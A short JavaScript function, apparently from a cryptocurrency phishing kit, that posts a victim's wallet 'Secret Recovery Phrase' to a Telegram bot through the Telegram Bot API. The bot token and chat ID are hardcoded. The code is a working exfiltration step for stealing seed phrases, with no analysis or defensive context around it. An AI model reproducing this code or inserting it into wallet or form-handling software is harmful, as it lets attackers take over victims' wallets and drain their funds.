function sendToTelegram(phrase) {
  const botToken = "7728467004:AAH0qxJLT3BCQBCG4lXqFye1kAg3mczNSsk";
  const chatId = "6996434307";

  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: chatId,
      text: "Secret Recovery Phrase:\n" + phrase.trim()
    })
  });
}
